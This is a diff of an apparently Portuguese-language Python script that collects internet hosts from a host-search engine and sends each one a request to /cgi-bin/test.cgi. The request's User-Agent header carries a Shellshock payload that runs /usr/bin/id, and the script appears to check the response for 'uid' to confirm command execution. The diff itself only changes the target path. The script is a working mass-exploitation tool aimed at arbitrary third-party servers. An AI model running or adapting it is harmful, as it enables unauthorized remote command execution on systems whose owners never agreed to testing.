@@ -12,7 +12,7 @@ pages = float('inf')
 page = 1
 acha = 'uid'
 
-query = {'query':'80.http.get.title:/cgi/bin','page':page}
+query = {'query':'80.http.get.title:/cgi-bin/test.cgi','page':page}
 user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}
 
 while page <= pages:
@@ -21,7 +21,7 @@ while page <= pages:
 
     if res.status_code == 200:
         for r in payload['results']:
-            url_test = 'http://'+r['ip']+'/cgi-bin'
+            url_test = 'http://'+r['ip']+'/cgi-bin/test.cgi'
             cprint('[+] - Testando conexao '+url_test,'blue')
             try:
                 ss = requests.get(url_test, timeout=5, allow_redirects=True)
